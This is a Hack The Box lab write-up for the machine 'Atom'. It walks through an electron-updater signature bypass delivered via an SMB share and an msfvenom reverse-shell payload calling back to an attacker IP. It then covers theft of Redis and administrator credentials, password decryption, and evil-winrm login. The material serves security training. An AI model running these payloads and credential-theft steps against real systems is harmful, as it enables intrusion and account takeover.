---
title: Atom
description: 'Malicious PDF file to remote code execution and abusing Redis to get the admin credentials'
pubDate: 2024-04-19
category: 'hackthebox'
tags: ['msfvenom', 'redis']
image: 'https://labs.hackthebox.com/storage/avatars/27ea1e1be5e83989ad5b6361773f4eaa.png'
---

In the app (heedv1) we can modify the update `url` in `/resources/app-update.yml`
https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

An evil `latest.yml` file, pointing the url to the attacker, should be created with a `'` in the file name.
This will be executed on the remote machine when uploaded to the smb share in a clientX folder (see PDF).

## USER

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.76 LPORT=4444 -f exe > "r'everse.exe"
shasum -a 512 "r'everse.exe" | cut -d " " -f1 | xxd -r -p | base64
```

Set the sha512 and the size in the `latest.yml` file.


```bash
smbclient //10.10.10.237/Software_Updates/
cd client1
put latest.yml
```

## ROOT

```powershell
C:\Program Files\Redis>type redis.windows-service.conf
type redis.windows-service.conf
# Redis configuration file example
requirepass kidvscat_yes_kidvscat
```
```bash
telnet atom.htb 6379

AUTH kidvscat_yes_kidvscat
CONFIG GET *
```

```
KEYS *
[...]
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
```

```
GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
```

```json
{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}
```

Modified code of https://www.exploit-db.com/exploits/49409 to decrpyt the `EncryptedPassword`.

```bash
python3 decrypt.py
kidvscat_admin_@123
```

Login with Windows Remoting (using evil-winrm):

```bash
evil-winrm -i atom.htb -u Administrator -p kidvscat_admin_@123
```
